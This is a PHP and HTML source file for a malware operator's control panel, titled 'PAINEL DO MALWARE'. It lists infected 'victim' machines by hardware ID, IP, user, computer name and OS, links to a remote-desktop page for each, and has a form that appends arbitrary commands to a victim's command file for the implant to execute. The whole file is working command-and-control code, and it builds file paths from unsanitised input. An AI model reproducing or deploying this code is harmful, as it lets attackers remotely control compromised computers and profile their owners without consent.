<?php
    if (isset($_POST['vcommand'])) {
        $hwid = $_POST['vhwid'];
        $cmd = $_POST['vcmd'];
        if (is_file("Users/".$hwid."/cmd.txt")) {
            $fopen = fopen("Users/".$hwid."/cmd.txt", "a");
            fwrite($fopen, $cmd);
            fclose($fopen);
            header("refresh:0");
            die();
        }
    }
?>
<html>
    <head>
        <title>PAINEL DO MALWARE</title>
    </head>
    <body>
        <form method="POST">
            <input type="text" name="vhwid">
            <input type="text" name="vcmd">
            <input type="submit" name="vcommand">
        </form>
        <table width="70%" border="1" cellspacing="0">
            <tr>
                <td>Hwid</td>
                <td>Ip</td>
                <td>User</td>
                <td>Pc</td>
                <td>Os</td>
                <td>RDP</td>
            </tr>
            <?php
                $files = array_filter(glob("Users/*"), 'is_dir');
                $limite = count($files);
                for($i = 0; $i < $limite; $i++) {
                    $vitima = file_get_contents($files[$i]."/info.txt");
                    $dados = explode("|", $vitima);
            ?>
                <tr>
                    <td><?php echo $dados[0]; ?></td>
                    <td><?php echo $dados[1]; ?></td>
                    <td><?php echo $dados[2]; ?></td>
                    <td><?php echo $dados[3]; ?></td>
                    <td><?php echo $dados[4]; ?></td>
                    <td>
                        <a href="rdp.php?hwid=<?php echo $dados[0]; ?>">ABRIR </a>
                    </td>
                </tr>
            <?php
                }
            ?>

        </table>
    </body> 
</html>